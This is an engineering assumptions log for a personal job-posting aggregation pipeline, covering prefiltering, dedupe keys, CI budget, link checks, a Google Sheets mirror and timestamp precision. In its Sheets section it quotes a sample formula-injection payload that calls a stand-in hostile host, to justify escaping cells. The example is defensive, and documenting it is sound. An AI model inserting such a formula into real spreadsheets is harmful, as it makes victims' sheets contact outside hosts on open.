# Assumptions

Every ambiguity resolved without asking. Format: the call, why, and what would
change if it is wrong. Reverse-chronological by phase.

---

## Phase 1

### B1 — A prefilter runs before storage, and it is not in the brief
The brief's pipeline is fetch → normalize → dedupe → triage → store. I added a
deterministic eligibility gate (`triage/prefilter.py`) *before* storage.

**Why:** the ATS feeds return every open req a company has. Measured on the live
run, that is 15,968 postings across 68 boards, of which 15,629 are sales,
recruiting, senior or otherwise ineligible. Storing them would put ~19k rows in
a database that gets committed to git every 30 minutes, and bury the real
postings in every `recent` listing.

This is the rules half of the hybrid triage you chose, arriving one phase early.
It answers "is this even the right kind of job", never "how good is it" — no
score is assigned.

**If wrong:** the gate is lenient by design (dropping a real posting is
invisible; keeping junk costs a row). Every rule is a high-confidence exclusion.
Reversing it is deleting one call in `runner.py`.

### B2 — Two prefilter strictness levels
Curated GitHub feeds run lenient; raw ATS boards run strict, requiring an
early-career signal in the title or body.

**Why:** on a curated new-grad repo, an unlabeled "Software Engineer" is very
likely the unlabeled new-grad req. On a raw company board it is overwhelmingly
an experienced-IC role — sampled live: "Researcher, Alignment", "Software
Engineer, Money Movement", "Distributed Systems Engineer - Data Platform". I
audited 341 postings dropped by this rule across ten target boards and found no
genuine new-grad reqs among them.

**Would have asked:** are you willing to trade some recall on unlabeled ATS
reqs for a database that is 8x smaller and actually readable?

### B3 — `INTERN_USA.md` does not exist; README.md is used instead
Neither speedyapply repo has that file. The USA internship tables are inside
`README.md`. Documented with the full file listing in `docs/sources.md`.

### B4 — speedyapply's relative `Age` column becomes `posted_at`
`1d` / `12d` / `2mo` is converted to `now - age`. This is the source's own
stated age rather than an inference, but it is only day-granular.

**Tension with the brief:** "posted_at if the source provides it, else null — do
not guess". I judged a stated relative age to be provided, not guessed. It is
the only recency signal those tables carry, and recency is what decides whether
you are an early applicant. Say the word and I will null it instead.

### B5 — International speedyapply files are not read
`INTERN_INTL.md` and `NEW_GRAD_INTL.md` are skipped. They would roughly triple
volume with postings that fail triage on location anyway.

**If wrong:** one line in `sources/speedyapply.py:FILES`.

### B6 — Dead ATS tokens are deleted, not disabled
18 of 89 boards 404'd and were removed from `companies.json` rather than kept
with `verified: false`. A dead token costs a request every run forever and can
never return data. The removed names are listed in the file's header comment so
you can revisit them by hand.

### B7 — Replay payloads are prefiltered postings, not raw source bytes
`--replay` needs stored payloads. Storing the raw responses meant 10.4 MB per
run in a git-committed database. Instead the prefiltered `RawPosting`s are
stored, zlib-compressed, for the last 3 runs, and `VACUUM` runs after pruning.
Result: 2.0 MB total instead of 14 MB and growing.

**Cost:** a posting dropped by the prefilter cannot be replayed. Since triage
only ever sees post-prefilter postings, replay fidelity for triage is exact.

### B8 — Simplify categories `Hardware` and `Product` are dropped
Kept: Software, Software Engineering, AI/ML/Data, "Data Science, AI & Machine
Learning", Quant. Quant is kept because several quant firms hire new-grad SWEs.

### B9 — ATS is one source, not ~70
All boards are fetched inside a single `ats` source so the run report stays
readable and dead tokens surface as one warning rather than 70 rows.

**Cost:** per-company latency is not in the report. It is in the JSON logs.

### B10 — ATS boards are polled with a 0.15s gap
~70 unauthenticated free APIs hit back-to-back every 30 minutes is how a
personal tool gets IP-banned. Costs ~10s per run.

---

## Phase 0

### A1 — `unknown` is a first-class term, and terms are never guessed
The brief lists `unknown` in the term enum but does not say when to use it. I
made it the default for any posting without an explicit season+year or new-grad
marker, rather than inferring from context (e.g. assuming an intern posting seen
in August is for spring).

**Why:** `term` is a dedupe-key component. A guessed term that later resolves
differently produces a second row for the same req and a duplicate push.

**If wrong:** unlabeled postings cluster under `unknown` and need a manual pass.
The alternative failure — silent duplicate notifications — is worse.

### A2 — Multi-location postings key on the *first* listed office
"New York, NY; Seattle, WA" keys as `nyc`. Sources disagree on how many offices
they list for one req and in what order, so keying on the full set lets a repost
that drops a city escape dedupe.

**Would have asked:** should a req open in three metros be three rows (three
applications) or one? I assumed one.

**If wrong:** you lose per-metro visibility. Changing it is a one-line edit in
`primary_location`, but it changes every existing id, so it is cheap now and
expensive after the database has history.

### A3 — Dedupe biases toward collapsing
Where the two failure modes conflict I chose to merge. Duplicate interrupting
pushes destroy the signal value of the whole system; a wrongly merged posting
still reaches you through the surviving row.

The one place I deliberately went the other way: parentheticals that carry real
content (`(Backend)`, `(Machine Learning)`) are kept in the key, because
collapsing those loses a posting outright.

### A4 — Reposts do not reset lifecycle state
On re-seeing a known req, `upsert` refreshes `last_seen_at`, `apply_url`,
`location` and `source`, but preserves `first_seen_at`, `status`, `tier`,
`score` and `applied_at`. `posted_at` is filled only if previously null.

**Why:** otherwise a company recycling a req re-notifies you forever, and an old
row starts looking freshly posted, corrupting the posted-age signal that decides
whether you are an early applicant.

**If wrong:** a genuine relist (new hiring manager, reopened headcount) looks
stale. I judged that acceptable versus repeat pushes.

### A5 — `backlog_unapplied` counts only notified, unresolved tier 1/2 rows
The brief says "unapplied backlog exceeds 15 rows" without defining the set. I
excluded `new` (never surfaced, so not something you are behind on) and tier 3
(digest-only, never interrupts).

**If wrong:** the threshold trips at a different time. Single query to change.

### A6 — Level suffixes are stripped, seniority words are not
`II`, `L4`, `Level 4`, `E5`, `IC3` are removed from the key. `Senior`, `Staff`
and `Principal` are kept.

**Why:** ladder rungs vary between how a source and a repost describe the same
req; seniority words denote a genuinely different job you would not apply to.

### A7 — SQLite runs in `DELETE` journal mode, not WAL
WAL keeps state in `-wal`/`-shm` sidecars. Alongside a git-committed database
those either need committing (merge conflicts, corruption) or silently drop the
newest writes. Journal mode is set so a run leaves exactly one file. There is a
test asserting no sidecars survive a run.

### A8 — Company target list lives in `companies.json`, not `profile/targets.md`
Tier 1 requires "company in my target list". I put that flag on the ATS config
(`"target": true`) so one file drives both polling and tier gating, and kept
`profile/targets.md` for the prose preferences the scorer needs.

**If wrong:** a company you want in the tier-1 gate but whose board is not
pollable has nowhere to live. Tell me and I will add a standalone target list.

### A9 — Seeded ATS tokens are unverified guesses
All 89 entries in `companies.json` use the company's conventional slug and are
marked `"verified": false`. Some will 404 — companies migrate ATS vendors and
change slugs. Phase 1 probes each, flips the flag, and reports failures rather
than failing the run. **Do not read this file as a verified list yet.**

Large employers (Google, Meta, Amazon, Apple, Microsoft, NVIDIA) are
deliberately excluded: they run proprietary career sites, not public
Greenhouse/Lever/Ashby boards. Listing them would produce permanent 404s rather
than coverage. They arrive via the Simplify and speedyapply feeds instead.

### A10 — Location buckets are metro-level and US-centric
Roughly 45 metros, with a `us-{state}` fallback for unrecognized US cities and a
slugified fallback beyond that. Built for the metros that dominate US new-grad
SWE hiring; international coverage is thinner.

**If wrong:** an unlisted city becomes its own bucket. That is safe (it
under-collapses rather than over-collapses) and adding an alias is one line.

### A11 — Term enum has no `summer-2026`
Summer 2026 has already passed as of this build. Titles referencing it resolve
to `unknown` rather than silently landing in `summer-2027`.

### A12 — Two-letter state codes only for the US
`us-{code}` fallback keys off a US state list. A Canadian province code
("Toronto, ON") falls through to city matching, which covers the major metros
explicitly.

---

## Phase C — free-tier budget

### C1 — The runtime problem was not where the handoff said it was
The handoff attributed 5m43s of runner time to setup ("5m43s on the runner vs
23s locally means setup dominates"). The first CI run's own report says
`duration_s: 324.57` against a 350s wall clock, so setup was ~25s and the
pipeline was 93% of the job. Within the pipeline, the four source fetches were
22.6s combined and the remaining ~302s was `_validate_links` resolving 300 new
postings one at a time. The fix applied is concurrency there, not setup tuning.

**If wrong:** the per-step timings from the next scheduled run will say so —
the workflow now writes a fetch-vs-everything-else split to the step summary.

### C2 — 5m50s was a cold-start cost, not the steady-state cost
That run was the first to see the live corpus: 308 new postings, so 300 link
checks. At ~70 new eligible postings/day over 157 runs/week the steady-state
batch is roughly one or two postings, and the link phase is seconds. The
budget projection below assumes steady state and treats the cold start as the
worst case the 10-minute job timeout has to survive.

### C3 — ETag validators moved out of `postings.db` rather than caching the DB
`actions/cache` on `data/postings.db` would have been the smaller diff, but
`run()` only restores from the committed JSONL when the database is empty
(`runner.py`), so a restored cache would skip the restore and quietly make the
cache the source of truth — inverting the invariant the whole export exists to
hold. The validators live in `data/http-cache.db` instead: it is the only file
the workflow restores, it holds nothing that is not re-derivable from one full
fetch, and `postings.db` still starts empty and still gets rebuilt from
`data/postings.jsonl` on every run.

### C4 — Link checks fan out 8 wide
A batch is spread across many hosts, so 8 in flight is a few connections per
domain rather than a burst at any one of them. Known bot-protected domains are
still never contacted. Raise `LINKCHECK_WORKERS` in `runner.py` if a backfill
needs it; it is not worth making an env var for one number.

### C5 — The poll grid puts nothing between 01:00 and 03:00 local
`America/Los_Angeles` repeats 01:00–02:00 on the fall-back night and skips
02:00–03:00 on spring-forward, so a schedule landing there either fires twice
or not at all, twice a year. The off-hours entries are 03:00 and 23:00, which
are unambiguous in both directions. Asserted in `tests/test_workflows.py`.

### C6 — Artifacts upload on failure only
The replay bundle was uploading a 7 MB database on every green run: ~300 MB/day
of retention and a slice of the minute budget, to hold artifacts nobody opens.
On a red run it is still the whole picture, and `data/postings.db` is
reconstructible from the committed export in any case.

**If wrong:** a green-but-suspicious run has no replay bundle. The run report,
the committed export diff and `logs/*.jsonl` are all still there; only the
database snapshot is gone.

### C7 — Link checks are capped per registrable domain, not per hostname
Global fan-out is 8; any one operator sees at most 3. Actions runner IPs are
shared and widely published, and this pipeline already catalogues the bot
protection that treats them accordingly. The reason it is a hard cap rather
than a tuning knob: `blocked` is deliberately not an expiry signal, so a
throttled runner IP degrades *silently* — validation keeps returning statuses,
the statuses stop meaning anything, and nothing in the run report goes red.
Nothing downstream can detect it, so it has to be prevented at the source.

Keyed on the last two labels, so `boards.greenhouse.io`,
`job-boards.greenhouse.io` and `boards-api.greenhouse.io` share one budget.
That is wrong for a `.co.uk`-style suffix and right for every host in this
corpus, and the error direction is safe: over-collapsing only makes the cap
stricter.

### C8 — Ingest link timeout is 5s, the pre-notification recheck stays 2.5s
Even fanned out, a 300-posting cold batch at the library's 12s default is
minutes of worst case, and a board that has not answered in 5 seconds is not
one to send an application to. `check` may do a HEAD then a GET, so the real
per-posting ceiling is 10s. The pre-notification recheck is a different
question — it sits in the critical path of a push — and keeps its own budget.

**If wrong:** a genuinely slow board gets filed `unreachable`. That is not an
expiry signal, so the posting survives and is rechecked; the cost is a link
whose status is unknown for a cycle, not a lost req.

### C9 — `restore()` builds its INSERT from `FIELDS`
It used to carry a second, hand-written column list, and the two had drifted by
four columns: the recruiter fields were exported and then dropped on every
restore. Since the database is rebuilt from the export at the start of every
run, that is not "lost on restore" — it is deleted from the record every 30
minutes, forever. The recruiter feature would have shipped months from now,
tested clean locally, and lost every lookup on the first CI run.

`link_checked_at` was the same defect one step earlier: on the model, written
to the database, and absent from `FIELDS`, so it never reached the export at
all. Added; the export gained one key and nothing else, verified row-by-row
against the previous file before committing.

`tests/test_export.py` asserts the round trip in both directions — every
`FIELDS` entry survives export→restore, and every model field is in `FIELDS`.
The fixture populates every field with a distinguishable value on purpose: a
round-trip test whose fixture leaves fields at `None` passes whether or not
they survive, which is how the original drift went unnoticed.

---

## Phase D — the two index views

### D1 — Date-primary ordering was already the behaviour
The brief asked to change `INDEX.md` from score-first to date-first. It was
already `(posted_at, score)` descending, in both `index_md.render` and
`jobpipe list`. What made it look score-blind was the display: `posted_age`
collapses everything from the last hour into "just posted", so a correct
date-descending sort shows a score of 0 above a score of 70 with nothing
visible to explain it.

The fix was therefore a column, not a sort. `INDEX.md` now carries the posted
date *and* the age, and the ordering is auditable from the page. This is the
same lesson the Sheets mirror encodes by storing a real date value rather than
a rendered string, for the same underlying reason: a rendered age cannot be
ordered, compared or checked.

### D2 — The 48-hour section requires a real `posted_at`
Never falls back to `first_seen_at`. That fallback would put every backfilled
req into "posted in the last 48 hours" on the day it was discovered, which is
exactly the claim the section exists to make. All 422 live postings currently
carry a `posted_at`, so nothing is lost to this today.

### D3 — The fresh section follows each file's sort, and says so
Flat across terms in both files, newest-first in `INDEX.md` and
highest-score-first in `INDEX-by-score.md`, with the ordering named in the
header line of each. The alternative — pinning it to newest-first in both —
makes the by-score file disagree with its own heading.

### D4 — Term grouping survives both sorts
Off-cycle co-ops stay above new grad in both files and in `jobpipe list
--sort score`. They are scarce enough that the grouping is the point; a
higher-scoring new grad req must not bury a fall 2026 co-op.

### D5 — Two files rather than one sortable table
The consumer is GitHub's markdown renderer, which does not sort. `write_both`
writes them together so a caller cannot update one and leave the other
disagreeing about what is live, and `tests/test_workflows.py` asserts every
regenerated path is in the workflow's `git add` line — a generated file that
is never staged looks green and stays stale.

---

## Phase E — Sheets mirror

### E1 — `google-auth` for credentials, plain `requests` for the API
The full `google-api-python-client` would add a discovery layer and a second
HTTP stack for four endpoints. `google-auth` alone pulls `cryptography` and two
small ASN.1 packages: ~32 MB installed, ~4s cold and near zero against the
workflow's pip cache. Signing a service-account JWT by hand would save the
dependency and is not a thing to hand-roll.

### E2 — Rows are never deleted from the Live tab
An expired posting stops being updated and keeps its row. Deleting it would
take the notes beside it, and those are the only data in this system with no
upstream copy. The tab grows; that is what filtering is for.

### E3 — `USER_ENTERED`, therefore escaping
The date column has to arrive as a date rather than text, which needs
`USER_ENTERED`, which evaluates anything beginning `= + - @`. Company names and
job titles come from third-party feeds straight into a spreadsheet the user
opens, so a title of `=IMPORTXML("http://evil.test","//x")` would run on open.
Every text cell is prefixed with an apostrophe when it starts with a formula
character — Sheets' own "this is text" marker, not displayed. The same escaping
runs on the backlog import, which is exactly when nobody is watching.

### E4 — The extent read is `A:J`, not `A:A`
Sheets truncates trailing empty rows from a response, so reading column A alone
reports the last row *the pipeline* filled. A row the user added below it, with
a note in column I and nothing in A, is invisible to that read and the append
lands on top of it. The note survives — nothing writes past H — but it ends up
beside a posting he never chose, which is worse than losing it because it looks
correct. Found by probing, not by a fixture.

### E5 — Grid capacity is a hard ceiling, so it is reported before it bites
Sheets rejects a write past the last grid row rather than growing the tab. A
new spreadsheet is 1,000 rows; at ~70 new postings a day that is eight days.
`sheets setup` grows Live to 20,000 with `appendDimension` — which can only add
rows, unlike setting `gridProperties.rowCount`, which is a resize and can
therefore shrink, and a shrink deletes what was in the rows it removes. A run
sets `room_low` under 500 spare rows.

### E6 — Backpressure cannot currently suppress anything, and the read still fails open
Worth recording because it looks otherwise: `decide()` sends tier 2 to the
digest whether or not `backpressure` is set, so a stale backlog count changes a
reason string and nothing else today. The fail-open design does not lean on
that — if tier 2 ever gains a push condition, a Sheets outage must still not be
able to suppress it.

### E7 — `data/sheet-status.json` is committed
It is the last known copy of the user's status column, so a Sheets outage in CI
degrades the backlog count to "stale" rather than "empty". It is never
authoritative: the spreadsheet is. It does not weaken the
`data/applications.jsonl` invariant — that file remains local and read-only to
the pipeline — but it is the second place application status now lives, and the
repo must stay private.

### E8 — Conditional formatting is scoped to A-H
The rules read the user's columns I and J and colour only A-H. Formatting a
range is not writing to it, but a background colour the pipeline applied to a
notes column is still the pipeline having changed something it does not own.
For the same reason there is no data-validation dropdown on the status column,
which would otherwise be the nicer prompt.

### E9 — The backlog import is a command, not part of a run
`data/backlog-review.csv` is gitignored and therefore absent in CI. It is also
a frozen snapshot with no ids to match on, so it is written as a block — which
is safe exactly once and would silently re-associate any notes the user had
added if it were re-run against a different ordering.

---

## Phase F — first warm day

### F1 — The ETag cache broke the health signal for `ats`, and that is fixed
`ats` is 71 boards behind one source name. Before the validators persisted,
every board was fetched in full every run and `raw_fetched` was flat — which is
what the zero-yield alarm was built on ("a healthy feed returns roughly the
same number of postings regardless of how many are new"). With conditional
requests working, a board that 304s contributes no rows, so `raw_fetched` now
tracks *how much changed upstream*, not whether the source works. The first
warm day ranged **7,712 to 16,031** with nothing wrong, and a run where most
boards legitimately 304 is indistinguishable from one where most boards died.

The fix is to measure what the alarm was always trying to measure: endpoints
that answered. `ats` now reports `responding` (boards returning 200 or 304) out
of `units`, and health uses it when present, falling back to row volume for
single-endpoint sources where rows are still the right signal. Run reports
written before the field existed carry no value for it, and a missing key is
skipped rather than read as zero — otherwise the first run after the upgrade
looks like a total collapse.

This was a regression introduced by the cache, caught by reading ten runs of
real data rather than by a test.

### F2 — `simplify-newgrad` has not produced a single 304
Ten runs, ten 200s, with the row count drifting (1905 → 1883) between them. The
drift says the file genuinely changes, which would make 200 the correct answer
and the cache irrelevant for this source. It is not yet proven either way — the
alternative is that `raw.githubusercontent.com` is returning a validator that
never matches. Worth one targeted check; not worth guessing at.

### F3 — The backpressure mechanism stays dormant rather than being deleted
Tier 2 became digest-only by decision, which left `backpressure` reachable in
`decide()` but with no effect on the outcome. Deleting it would mean re-deriving
the threshold, the counting rule and the "quiet hours must not consume a slot"
interaction if tier 2 ever gains a push condition again. It stays wired and
tested; a test asserts the predicate still flips at the threshold.

What changed is the framing. The unapplied count is now the first line of the
digest and the first row of the Stats tab, in words — "23 postings you haven't
decided on" — because it is the one number in either view that is about the
reader rather than about the pipeline, and "backlog: 23 unapplied" reads as
instrumentation and gets skimmed past.

### F4 — Simplify never 304s because it genuinely changes every 30 minutes
Checked directly rather than guessed at. `raw.githubusercontent.com` does serve
an `ETag` for `listings.json` and does answer 304 to a conditional request, so
the cache is wired correctly. The commit history explains the 200s: Simplify's
bot rewrites the file **every 30 minutes**, at :01 and :31 past the hour
(median gap 30 min over the last 30 commits). Our poll is also every 30
minutes, so there is nothing to 304 and the 12.4 MB download is unavoidable.
It costs ~200ms and no billed minutes; there is nothing to fix.

The check did surface something worth fixing. The poll fired at :00 and :30 —
one minute *before* each publish — so anything Simplify posted waited a full
cycle. Moved to :05 and :35. GitHub's scheduler lag usually covered the gap by
accident, which is precisely why it was worth correcting: the punctual case is
the one where latency is best and where a self-inflicted 29-minute delay costs
the most. Same run count, same budget.

### F5 — Audit sampling is seeded from the data, not from the clock
`ORDER BY RANDOM()` every run would mean an otherwise unchanged run still
produced a diff, and an all-304 run must produce no commit. The sample is
seeded from a hash of the row identities, so it is fixed while the data is
fixed and changes as soon as the data does — which is exactly when a fresh
sample is worth having. Roughly 5 KB a run, one file per UTC day, pruned at 30
days; git history keeps the rest.

### F6 — The tier 1 new grad floor is 60, and the volume bound is the company
Of 75 live tier 2 new-grad postings, exactly **1** was at a target company.
Loosening the score alone would have admitted 22/day and drowned the 3/hour
interrupting cap; requiring target-company membership caps it near 1/day at any
floor between 60 and 70. So the floor is set low enough to catch a good req
that scores 63 for incidental reasons rather than tuned to admit exactly the
one posting visible on the day.

A test asserts the *premise* as well as the behaviour: if term or discipline
weights ever change so a new grad role can clear 75 unaided, the dedicated path
is redundant and the test says so.

### F7 — The schedule is banded because GitHub delivers about half of it
Measured across 17 real runs with `gh`: **13.9 runs a day against 29
scheduled — 48%**, median gap **59 minutes** against a nominal 30. The
scheduler drops fires under load; there is no SLA and nothing is broken.

Two things follow, and they pull in opposite directions:

- Latency, which is the entire premise of this system, was running at half the
  designed rate. So 08:00–12:00 PT — the hours that produce most US postings —
  now asks for every 15 minutes, because 15 asked for is ~30 received.
- The budget looks comfortable *because* delivery is poor. Measured cost is
  ~880–1,040 billed min/month (857 scheduled runs, 48% delivered, 2.13–2.53
  billed minutes each); the same schedule at full delivery is ~1,825–2,170,
  at or over the 2,000 allowance. `make eval` warns above 1,200 projected, set
  deliberately just above the expected figure so it trips when delivery
  improves rather than after the bill.

`*/15` across the whole 06:00–19:00 window was rejected at ~2,700 min/month at
full delivery. An external cron driving `workflow_dispatch` would be more
punctual than any of these and was rejected on different grounds: it needs a
PAT with `workflow` scope held by a third party, which is the published-
credential shape the security invariants exclude.

**Do not widen the 15-minute band without redoing this arithmetic.** The
weekly run count is asserted in `tests/test_workflows.py` precisely so that
widening it fails a test rather than a bill.

### F8 — The 15-minute band is measured from ATS timestamps alone
The first version of this band was 08:00-12:00 PT, chosen from "when US
postings go up", which was an assumption wearing the clothes of a rationale.
Measured, the answer is different in both directions.

Charting `posted_at` across all sources produces four sharp spikes — 07:00,
12:00, 15:00, 18:00 PT — that look exactly like a publishing rhythm. They are
an artifact. speedyapply publishes an **age** ("2d") rather than a timestamp,
so `posted_at` is stamped relative to fetch time: 47 of its rows share a single
minute:second, 38 share another. Simplify is partly date-only (34 rows at
exactly midnight UTC). Only the ATS boards report a real publication instant,
via Greenhouse/Lever/Ashby `first_published`, and there the timestamps are
spread with at most 2 rows sharing any minute:second.

On 201 weekday ATS postings the best contiguous four hours is **09:00-13:00 PT
(36.8%)**, against 33.8% for the 08:00-12:00 originally shipped and **14.4%**
for the 06:00-09:00 that a "09:00 Eastern" assumption suggests. The peak is
*later* than the Eastern-hours intuition, not earlier.

Two caveats that matter more than the three-point gain:

- The curve is a **broad plateau** from 09:00 to 16:00, not a peak. The top
  four windows are within noise of each other at this sample size.
- 201 postings over ~2 days is thin. `jobpipe posting-hours` re-derives the
  whole thing; move the band only when the ordering is stable across weeks.

The run count is unchanged, so this costs nothing either way.

### F9 — Going over budget stops the pipeline rather than billing
A personal account with no payment method carries a $0 Actions spending limit,
so exhausting the 2,000 free minutes suspends scheduled runs until the next
cycle. "Over budget" is therefore an availability failure, which is why the
schedule can sit close to the line at full delivery without that being reckless.

It is also silent — no error, no email, the workflow simply stops firing, which
is the same shape as the 60-day auto-disable. The dead-man's switch is what
catches all three.

Not assertable in a test: the spending limit is not exposed through the REST
API for personal accounts (`/users/{u}/settings/billing/actions` needs the
`user` scope and returns usage, not the limit). Confirm it in the billing UI.
**Raising it above $0 converts the failure mode from "stops" to "charges"**,
and every budget figure in this repo changes meaning at that moment.

---

## Phase G — posted_at precision

### G1 — Precision is declared per source, not detected per row
`posted_precision` is `instant` for ATS, `date` for Simplify, `age_derived` for
speedyapply. The contamination it fixes reached further than the histogram that
exposed it: `posted_at` was the primary sort key for INDEX.md and the basis of
the 48-hour section, so an hour and a minute that were never real were deciding
what the user read first.

**The cost of the per-source call is concrete and worth knowing.** 76% of
Simplify rows corpus-wide carry a real time of day, and 67 of the 70
date-precision rows in the current 48-hour section do. Declaring the whole
source `date` marks all of them approximate. The alternative — inferring
precision per row from whether the timestamp is exactly midnight UTC — would
recover those, at the cost of misreading a genuine 00:00:00Z posting as
date-only. That error is rare and lands in the conservative direction, so the
per-row rule is arguably better on both axes.

It is not implemented because per-source was the instruction and because a rule
that reads precision out of the *value* is the kind of thing that quietly stops
being true when a feed changes format. Revisit with a bias toward doing it: the
evidence says it would recover most of the marked rows.

### G2 — The date is not `posted_at.date()`
A DATE row is a UTC calendar date wearing a timestamp. Converting it to Pacific
moves it to 17:00 the previous day and relabels the posting a day older than the
source said. An INSTANT row is a real moment and belongs in the reader's zone —
02:00Z on the 7th went up at 19:00 on the 6th as far as he is concerned.

`models.posted_date` holds both cases, and lives in `models` rather than in a
rendering module because INDEX.md and the Sheets mirror both sort on it. Two
answers to "what day is this" is one too many.

### G3 — The 48-hour window compares dates for imprecise rows
The exact test applied to a DATE row is not merely fuzzy, it is *biased*: the
row is stored at midnight, so its computed age is always an overestimate, and
it drops out of the window up to a day early. Always in the direction of hiding
something fresh, which is the one direction that matters here. INSTANT rows keep
the exact test; the rest are "today or yesterday" in Pacific, which leaves an
error of up to a day in *either* direction instead of a full day in the wrong
one. The section states how many of its rows are approximate.

### G4 — Sorting gained `id` as a final tiebreak
Date, tier and score leave ties, and without a total order the output depends on
the order rows come back from the store. That would make INDEX.md flap between
runs and produce commits with no content change — defeating the
skip-commit-when-unchanged rule that the whole export format exists to support.

### G5 — Precision is read per row for Simplify, and the risk is monitored
G1 chose per-source and flagged the cost; the cost was worse than the estimate.
Declaring the whole feed `date` marked **64 of the 66** rows in the 48-hour
section approximate. A warning that is always on is a warning nobody reads —
the same failure the suspect-link annotation had before it stopped firing on
known bot-blocked domains. Per row it is **12 of 78**, and the mark means
something again.

The rule: exactly `00:00:00.000000` UTC is a date, anything else is an instant.
A genuine posting at that instant is misread, which is rare and errs
conservative — an exact row marked approximate rather than the reverse.

**The objection to reading precision out of a value stands, so it is monitored
rather than avoided.** A feed that switched to emitting midnight for everything
would reclassify itself silently. `SourceReport` now carries `dated` and
`midnight` per run, and `health` alarms when the share moves 25 points against
its trailing median in either direction — losing the midnight rows is as much a
format change as gaining them. Below 30 dated rows it never fires, and history
predating the fields is skipped rather than read as zero, so the first run after
this lands does not look like a jump from 0%.

This is the same move as `responding` for `ats`: when a check stops being true,
find the signal that stays true rather than dropping the check.

For a per-row source the stored precision is *derived*, so `restore()`
recomputes it instead of trusting the export. That is what let this change land
without a migration — the 109 Simplify rows reclassified themselves on the next
restore — and it is what makes a future format change self-correcting. The
alarm is the thing that tells you it happened.

### G6 — Export format changes stop the poll first
Landing a format change races the poll, which rewrites the same file every run.
It has already produced one mid-rebase conflict on generated files. The runbook
now carries the procedure: `gh workflow disable poll.yml`, land and regenerate,
verify row-by-row that the diff is confined to the new field, push, then
`gh workflow enable poll.yml`.

Re-enabling is the step that needs the warning. A disabled workflow produces no
error, no failed run and no email — the same silent shape as the 60-day
auto-disable and an exhausted minute allowance — and only the dead-man's switch
notices, after its grace period.
